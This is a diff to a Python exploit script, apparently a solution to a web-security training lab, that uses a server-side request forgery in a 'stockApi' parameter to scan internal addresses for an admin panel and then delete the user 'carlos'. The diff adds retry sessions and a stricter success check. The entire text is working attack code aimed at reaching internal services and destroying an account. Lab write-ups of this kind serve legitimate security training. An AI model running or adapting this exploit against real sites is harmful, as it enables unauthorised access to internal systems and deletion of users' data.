@@ -1,12 +1,17 @@
 import sys
 import requests
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
+
 
 
 def find_admin_interface(url):
     try:
+        session = requests.Session()
+        session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))
         for i in range(1, 256):
             admin_interface_url = f"http://192.168.0.{i}:8080/admin"
-            response = requests.post(f"{url}/product/stock", data={"stockApi": admin_interface_url}, timeout=10)
+            response = session.post(f"{url}/product/stock", data={"stockApi": admin_interface_url}, timeout=10)
             if response.status_code == 200:
                 return admin_interface_url
 
@@ -20,12 +25,15 @@ def find_admin_interface(url):
 
 
 def delete_carlos_user(url, admin_interface_url):
+    session = requests.Session()
+    session.mount("https://", HTTPAdapter(max_retries=Retry(total=5, backoff_factor=0.1)))
+
     # Deleting Carlos user
-    requests.post(f"{url}/product/stock", data={"stockApi": f"{admin_interface_url}/delete?username=carlos"}, allow_redirects=False)
+    session.post(f"{url}/product/stock", data={"stockApi": f"{admin_interface_url}/delete?username=carlos"}, allow_redirects=False)
 
     # Verifying Carlos's account has been deleted
-    response = requests.post(f"{url}/product/stock", data={"stockApi": admin_interface_url})
-    return not "carlos" in response.text
+    response = session.post(f"{url}/product/stock", data={"stockApi": admin_interface_url})
+    return "carlos" not in response.text and response.status_code == 200
 
 
 def main():
